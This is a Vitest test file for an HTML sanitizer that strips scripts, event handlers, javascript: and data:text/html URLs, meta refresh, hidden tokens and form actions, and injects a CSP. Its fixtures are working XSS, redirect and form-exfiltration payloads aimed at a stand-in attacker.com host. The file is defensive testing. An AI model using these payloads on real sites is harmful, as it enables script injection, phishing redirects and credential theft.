import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from './index';

describe('Sanitizer', () => {
  it('remove scripts inline e tags <script>', () => {
    const dirty = '<html><head><script>alert("xss")</script></head><body><script src="evil.js"></script><p>Ola</p></body></html>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('evil.js');
    expect(clean).toContain('Ola');
  });

  it('remove event handlers inline (onclick, onerror, onload, etc.)', () => {
    const dirty = '<div><button onclick="bad()" onmouseover="bad2()">Click</button><img src="x.png" onerror="bad3()"></div>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('onmouseover');
    expect(clean).not.toContain('onerror');
    expect(clean).toContain('<button>Click</button>');
  });

  it('remove links com javascript:', () => {
    const dirty = '<a href="javascript:alert(1)">Link</a><iframe src="javascript:evil()"></iframe>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('javascript:alert(1)');
    expect(clean).not.toContain('javascript:evil()');
  });

  it('remove campos de senha (input type="password")', () => {
    const dirty = '<form><input type="text" name="user"><input type="password" name="pass" value="secret"></form>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('type="password"');
    expect(clean).not.toContain('secret');
    expect(clean).toContain('name="user"');
  });

  it('remove campos hidden e tokens sensíveis (csrf, token, nonce)', () => {
    const dirty = '<form><input type="hidden" name="csrf_token" value="abc123xyz"><input type="text" name="data"></form>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('csrf_token');
    expect(clean).not.toContain('abc123xyz');
    expect(clean).not.toContain('type="hidden"');
    expect(clean).toContain('name="data"');
  });

  it('remove atributos nonce e integrity', () => {
    const dirty = '<style nonce="random123">body{color:red}</style><link rel="stylesheet" href="a.css" integrity="sha256-xxx" nonce="xyz">';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('nonce=');
    expect(clean).not.toContain('integrity=');
    expect(clean).toContain('body{color:red}');
  });

  it('injeta meta CSP rigoroso como primeiro filho de <head>', () => {
    const html = '<html><head><title>Teste</title></head><body><p>Conteudo</p></body></html>';
    const clean = sanitizeHtml(html);

    const expectedCsp = "default-src 'none'; img-src 'self' data:; font-src 'self' data:; style-src 'self' 'unsafe-inline'; base-uri 'none'; form-action 'none'";
    expect(clean).toContain(`content="${expectedCsp}"`);
    expect(clean).toContain('http-equiv="Content-Security-Policy"');

    // Confirma que é o primeiro filho do head
    const parser = new DOMParser();
    const doc = parser.parseFromString(clean, 'text/html');
    const firstHeadChild = doc.head.firstElementChild;
    expect(firstHeadChild?.tagName.toLowerCase()).toBe('meta');
    expect(firstHeadChild?.getAttribute('http-equiv')).toBe('Content-Security-Policy');
  });

  it('remove tags <noscript> e <base>', () => {
    const dirty = '<html><head><base href="https://attacker.com/"><noscript><p>Sem js</p></noscript></head><body></body></html>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<base');
    expect(clean).not.toContain('<noscript');
  });

  it('[SEC-01] neutraliza iframes com srcdoc e forca sandbox', () => {
    const dirty = '<div><iframe srcdoc="<script>alert(1)</script>"></iframe></div>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('srcdoc=');
    expect(clean).not.toContain('alert(1)');
    expect(clean).toContain('sandbox=""');
  });

  it('[SEC-03] remove meta refresh para prevenir phishing / redirecionamento malicioso', () => {
    const dirty = `
      <html>
        <head>
          <meta http-equiv="refresh" content="0; url=https://attacker.com/normal">
          <meta http-equiv="  refresh  " content="0; url=https://attacker.com/spaces">
          <meta http-equiv="REFRESH" content="0; url=https://attacker.com/upper">
          <meta http-equiv="&#x09;Refresh&#x0A;" content="0; url=https://attacker.com/control">
        </head>
        <body></body>
      </html>
    `;
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('http-equiv="refresh"');
    expect(clean).not.toContain('attacker.com');
  });

  it('[SEC-06] bloqueia URLs javascript com tabs, espacos e controle, e bloqueia data:text/html', () => {
    const dirty = `
      <div>
        <a href="jav\tascript:alert(1)">Link com tab</a>
        <a href="jav\nascript:alert(2)">Link com newline</a>
        <a href="data:text/html,<script>alert(3)</script>">Link data html</a>
        <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
        <object data="data:text/html,<script>evil</script>"></object>
        <embed src="data:text/html,<script>evil</script>">
      </div>
    `;
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('jav\tascript:alert(1)');
    expect(clean).not.toContain('jav\nascript:alert(2)');
    expect(clean).not.toContain('data:text/html');
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
  });

  it('[SEC-07] neutraliza form action e desabilita botoes/inputs de submissao', () => {
    const dirty = `
      <form action="https://attacker.com/steal" method="POST">
        <input type="text" name="user" value="victim">
        <input type="submit" value="Enviar">
        <button type="submit" formaction="https://attacker.com/leak">Submeter</button>
      </form>
    `;
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('action="https://attacker.com/steal"');
    expect(clean).not.toContain('formaction="https://attacker.com/leak"');
    expect(clean).toContain('action="#"');
    expect(clean).toContain('disabled');
  });

  it('[SEC-12] lanca erro explicito se DOMParser nao estiver disponivel no runtime', () => {
    const origDomParser = globalThis.DOMParser;
    try {
      // @ts-ignore
      delete globalThis.DOMParser;
      expect(() => sanitizeHtml('<p>teste</p>')).toThrow('DOMParser');
    } finally {
      globalThis.DOMParser = origDomParser;
    }
  });
});
